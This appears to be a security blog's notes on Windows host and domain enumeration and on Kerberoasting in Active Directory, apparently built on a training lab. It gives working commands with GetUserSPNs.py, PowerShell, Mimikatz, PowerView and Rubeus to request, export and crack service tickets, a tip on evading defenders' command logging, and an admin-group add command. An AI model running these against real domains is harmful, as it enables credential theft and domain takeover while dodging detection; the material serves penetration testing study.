href=\"https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts\">netsh</a> and <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query\">sc</a> to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.</p>\n<p>Firewall check - <code>netsh advfirewall show allprofiles</code></p>\n<p>Defender check cmd - <code>sc query windefend</code></p>\n<p>Checking the status and configuration settings - <code>Get-MpComputerStatus</code></p>\n<h2 id=\"Am-I-Alone\"><a href=\"#Am-I-Alone\" class=\"headerlink\" title=\"Am I Alone?\"></a>Am I Alone?</h2><p>When landing on a host for the first time, it’s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.</p>\n<p>If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.</p>\n<h3 id=\"Network-Enumeration\"><a href=\"#Network-Enumeration\" class=\"headerlink\" title=\"Network Enumeration\"></a>Network Enumeration</h3><table>\n<thead>\n<tr>\n<th>Networking Commands</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>arp -a</td>\n<td>Lists all known hosts stored in the arp table.</td>\n</tr>\n<tr>\n<td>ipconfig &#x2F;all</td>\n<td>Prints out adapter settings for the host. We can figure out the network segment from here.</td>\n</tr>\n<tr>\n<td>route print</td>\n<td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td>\n</tr>\n<tr>\n<td>netsh advfirewall shows state</td>\n<td>Displays the status of the host’s firewall. We can determine if it is active and filtering traffic.</td>\n</tr>\n</tbody></table>\n<h3 id=\"Windows-Management-Instrumentation-WMI\"><a href=\"#Windows-Management-Instrumentation-WMI\" class=\"headerlink\" title=\"Windows Management Instrumentation (WMI)\"></a>Windows Management Instrumentation (WMI)</h3><p> This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.</p>\n<p><strong>Quick WMI checks</strong></p>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>\n<td>Prints the patch level and description of the Hotfixes applied</td>\n</tr>\n<tr>\n<td>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:List</td>\n<td>Displays basic host information to include any attributes within the list</td>\n</tr>\n<tr>\n<td>wmic process list &#x2F;format:list</td>\n<td>A listing of all processes on host</td>\n</tr>\n<tr>\n<td>wmic ntdomain list &#x2F;format:list</td>\n<td>Displays information about the Domain and Domain Controllers</td>\n</tr>\n<tr>\n<td>wmic useraccount list &#x2F;format:list</td>\n<td>Displays information about all local accounts and any domain accounts that have logged into the device</td>\n</tr>\n<tr>\n<td>wmic group list &#x2F;format:list</td>\n<td>Information about all local groups</td>\n</tr>\n<tr>\n<td>wmic sysaccount list &#x2F;format:list</td>\n<td>Dumps information about any system accounts that are being used as service accounts.</td>\n</tr>\n</tbody></table>\n<p>This <a href=\"https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4\">cheatsheet</a> has some useful commands for querying host and domain info using wmic.</p>\n<h3 id=\"Net-Commands\"><a href=\"#Net-Commands\" class=\"headerlink\" title=\"Net Commands\"></a>Net Commands</h3><p>Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.</p>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>net accounts</td>\n<td>Information about password requirements</td>\n</tr>\n<tr>\n<td>net accounts &#x2F;domain</td>\n<td>Password and lockout policy</td>\n</tr>\n<tr>\n<td>net group &#x2F;domain</td>\n<td>Information about domain groups</td>\n</tr>\n<tr>\n<td>net group “Domain Admins” &#x2F;domain</td>\n<td>List users with domain admin privileges</td>\n</tr>\n<tr>\n<td>net group “domain computers” &#x2F;domain</td>\n<td>List of PCs connected to the domain</td>\n</tr>\n<tr>\n<td>net group “Domain Controllers” &#x2F;domain</td>\n<td>List PC accounts of domains controllers</td>\n</tr>\n<tr>\n<td>net group <domain_group_name> &#x2F;domain</td>\n<td>User that belongs to the group</td>\n</tr>\n<tr>\n<td>net groups &#x2F;domain</td>\n<td>List of domain groups</td>\n</tr>\n<tr>\n<td>net localgroup</td>\n<td>All available groups</td>\n</tr>\n<tr>\n<td>net localgroup administrators &#x2F;domain</td>\n<td>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</td>\n</tr>\n<tr>\n<td>net localgroup Administrators</td>\n<td>Information about a group (admins)</td>\n</tr>\n<tr>\n<td>net localgroup administrators [username] &#x2F;add</td>\n<td>Add user to administrators</td>\n</tr>\n<tr>\n<td>net share</td>\n<td>Check current shares</td>\n</tr>\n<tr>\n<td>net user <ACCOUNT_NAME> &#x2F;domain</td>\n<td>Get information about a user within the domain</td>\n</tr>\n<tr>\n<td>net user &#x2F;domain</td>\n<td>List all users of the domain</td>\n</tr>\n<tr>\n<td>net user %username%</td>\n<td>Information about the current user</td>\n</tr>\n<tr>\n<td>net use x: \\computer\\share</td>\n<td>Mount the share locally</td>\n</tr>\n<tr>\n<td>net view</td>\n<td>Get a list of computers</td>\n</tr>\n<tr>\n<td>net view &#x2F;all &#x2F;domain[:domainname]</td>\n<td>Shares on the domains</td>\n</tr>\n<tr>\n<td>net view \\computer &#x2F;ALL</td>\n<td>List shares of a computer</td>\n</tr>\n<tr>\n<td>net view &#x2F;domain</td>\n<td>List of PCs of the domain</td>\n</tr>\n</tbody></table>\n<h2 id=\"Net-Command-Tip\"><a href=\"#Net-Command-Tip\" class=\"headerlink\" title=\"Net Command Tip.\"></a>Net Command Tip.</h2><p>If you are in an environment where network defenders are actively logging&#x2F;looking for any commands out of the normal you can try typing <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>net1</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> instead of the <strong><strong><strong><strong>net</strong></strong></strong></strong> to work out using the net command.</p>\n<h2 id=\"Dsquery\"><a href=\"#Dsquery\" class=\"headerlink\" title=\"Dsquery\"></a>Dsquery</h2><p>A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.</p>\n<p><strong><strong>Dsquery</strong></strong> will exist on any host with the <code>Active Directory Domain Services Role</code> installed, and the <code>dsquery</code> DLL exists on all modern Windows systems by default now and can be found at <code>C:\\Windows\\System32\\dsquery.dll</code></p>\n<p>A long read but worthy to check up on those commands one might not remember …</p>\n"},{"title":"KERBEROS","date":"2023-07-12T21:00:00.000Z","draft":false,"description":"Active Directory kerberos","top_img":"/images/cyberpunk-red.jpg","_content":"\n\n![](https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png)\n## Kerberoasting\n    \nThe Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.\n    \n*NB* [****kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network**]**\n    \n![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png)\n    \n### How Kerb Auth works!\n        \nIn every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.\n        \n![1.webp](https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png)\n        \nKerberos uses symmetric cryptography for encryption and decryption.\n        \nFor explanation purposes, we use three colours to distinguish Hashes:\n        \n- **BLUE _KEY**: User NTLM HASH\n- **YELLOW_KEY**: Krbtgt NTLM HASH\n- **RED_KEY:** Service NTLM HASH\n        \n**Step 1:** By sending the request message to KDC, the client initializes communication as:\n        \n***KRB_AS_REQ contains the following:***\n        \n- The username of the client is to be authenticated.\n- *The service **SPN (SERVICE PRINCIPAL NAME)** linked with the Krbtgt account*\n- *An encrypted timestamp (Locked with User Hash: Blue Key)*\n        \nThe entire message is encrypted using the User NTLM hash (**Locked with BLUE KEY**) to authenticate the user and prevent replay attacks.\n        \n**Step 2:** The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (**Unlock with BLUE KEY**) that authenticates user identification.\n        \nThen KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) & some Encrypted Message using User Hash.\n        \n***KRB_AS_REP contains the following:***\n        \n- ***Username***\n- *Some encrypted data, (Locked with User Hash: Blue Key) that contains:*\n- *Session key*\n- *The expiration date of TGT*\n- ***TGT**, (Locked with Krbtgt Hash: Yellow Key) which contains:*\n- *Username*\n- *Session key*\n- *The expiration date of TGT*\n- *PAC with user privileges, signed by KDC*\n        \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1)\n        \n**Step 3:** The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.\n        \n***KRB_TGS_REQ** contains:*\n        \n- *Encrypted data with the session key*\n- *Username*\n- *Timestamp*\n- *TGT*\n- *SPN of requested service e.g. SQL service*\n        \n**Step 4:** The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash **(Locked with Red Key)** & Some Encrypted Message using User Hash.\n        \n***KRB_TGS_REP contains:***\n        \n- *Username*\n- *Encrypted data with the session key:*\n- *Service session key*\n- *The expiration date of TGS*\n- ***TGS**, (Service Hash: RED Key) which contains:*\n- *Service session key*\n- *Username*\n- *The expiration date of TGS*\n- *PAC with user privileges, signed by KDC*\n        \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1)\n        \n**Step 5:** The user sends the copy of TGS to the Application Server,\n        \n***KRB_AP_REQ contains:***\n        \n- *TGS*\n- *Encrypted data with the service session key:*\n- *Username*\n- *Timestamp, to avoid replay attacks*\n        \n**Step 6:** The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.\n        \n**Step 7:**  KDC verifies PAC (Optional)\n        \n**Step 8:**  Allow the user to access the service for a specific time.\n        \n## SPNs\n        \nThe Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.\n        \n**Important Points**\n        \n- If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.\n- Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.\n- A given SPN can be registered on only one account.\n- An SPN must be unique in the forest in which it is registered.\n- If it is not unique, authentication will fail.\n\n### SPNS syntax\n\n**The SPN syntax has four elements**\n        \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1)\n        \n### Type of SPN\n        \n- Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks\n- SPNs that have been associated with a domain user account where NTLM hash will be used.\n\n\n### Linux Perspective\n        \n        \n#### Attack Procedure.\n       \nDepending on your positioning a network, Kerberos attacks can be performed in multiple ways.\n        \n- From a non-domain joined Linux host using valid domain user credentials.\n- From a domain-joined Linux host as root after retrieving the keytab file.\n- From a domain-joined Windows, the host is authenticated as a domain user.\n- From a domain-joined Windows host with a shell in the context of a domain account.\n- As SYSTEM on a domain-joined Windows host.\n- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.\n        \n#### Tools.\n        \nSome tools can be utilized to perform the attack.\n        \n- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.\n- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.\n- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.\n        \n        \n**********************REMEMBER!!!**********************\n\nObtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.\n        \nTGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.\n        \n\n        \n#### The efficiency of Attack\n        \nWhile it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.\n        \nWe might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.\n        \n**N/B -** When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.\n        \n        \n**********************REMEMBER!!!**********************\n        \nA prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.\n        \n\n#### GetUserSPNs.py\n        \n**Listing SPN Accounts.**\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`\n        \n#### Requesting all TGS tickets.**\n        \nLater on, we can pull all TGS tickets for offline processing using the **-request** flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`\n        \n#### Requesting a Single TGS Ticket.\n        \nWte can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the required account.\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user`\n        \nWith this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.\n        \nSaving the Ticket o facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`\n        \n### Windows Perspective\n        \nKerberoasting - Semi-Manual Method.\n        \n#### Enumerating SPNs with setspn.exe\n        \n`setspn.exe -Q */*` running the command you’ll notice many different SPNs returned for the various hosts in the domain.\n        \n#### Retrieving All Tickets using setspn.exe\n        \n`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`\n        \nThe above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.\n        \nUsing ******************Powershell****************** we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using **Mimkatz.**\n        \n#### Targeting a Single User**************\n        \n```powershell\nPS C:\\htb> Add-Type -AssemblyName System.IdentityModel\nPS C:\\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n```\n        \nBefore moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):\n        \n- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object\n- The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using\n- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services\n- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object\n- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session\n        \nWe can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.\n        \nNow that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.\n        \n### Extracting Tickets from Memory with Mimikatz\n        \n```powershell\n        Using 'mimikatz.log' for logfile : OK\n        \n        mimikatz # base64 /out:true\n        isBase64InterceptInput  is false\n        isBase64InterceptOutput is true\n        \n        mimikatz # kerberos::list /export\n        \n        <SNIP>\n        \n        [00000002] - 0x00000017 - rc4_hmac_nt\n           Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM\n           Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL\n           Client Name: htb-student @ INLANEFREIGHT.LOCAL\n           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;\n        ====================\n        Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\n        ====================\n        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\n        ZWZyZWlnaHQubG9jYWw6MTQzMw==\n        ====================\n        \n           * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\n```\n        \nIf we don’t specify the **base64 /out:true** command, Mimikatz will extract the tickets and write the to **.kirbi** files. \n        \n Next, you prepare the base blob for cracking `echo \"<base64 blob>\" |  tr -d \\\\n` then place the above into a file and convert it back to a **.kirbi** file using the base64 utility.`cat encoded_file | base64 -d > sqldev.kirbi`\n        \n Extract the kerberos ticket using [kirbi2john.py](http://kirbi2john.py) this will create a file called **crack_file,** which then must be modified to be able to use Hashcat against the hash `python2.7 kirbi2john.py sqldev.kirbi`\n        \nModifying the crack file for hashcat `sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > sqldev_tgs_hashcat` now you can run the ticket through hashcat and get a clear password.\n        \n#### Skipped Version\n        \nSo if we decide to skip the base64 output with mimkatz and type **mimikatz # kerberos::list /export,** the **.kirbi** file will be written to disk, in this case, you can download the file and run **[kirbi2john.py](http://kirbi2john.py)** against them directly, skipping the base64 decoding step.\n        \n#### AUTOMATE VERSION\n        \nUsing [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS ticket and convert them to Hashcat format.\n        \n**Extracting TGS Ticket**\n        \n```powershell\n        PS C:\\htb> Import-Module .\\PowerView.ps1\n        PS C:\\htb> Get-DomainUser * -spn | select samaccountname\n        PS C:\\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n```\n        \n**Target Specific User**\n        \n`Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`\n        \n**Exporting All Tickets to a CSV file and viewing the Content**\n        \n`Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation`\n        \n`cat .\\ilfreight_tgs.csv`\n        \n## REBEUS\n            \n[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)\n            \nA tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos\n            \n[https://www.hackingarticles.in/a-detailed-guide-on-rubeus/](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)\n            \n### **Ticket Operations**\n            \nWorking in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.\n            \nIn this section, we’ll talk about Rubeus and its capability to play around with tickets.\n            \n#### Asktgt\n            \nRubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied\n            \n`rubeus.exe asktgt /user:harshitrajpal /password: Password@1`\n            \n ![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1)\n            \nAs you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.\n            \n`rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1)\n            \n**Asktgs**\n            \nRubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified 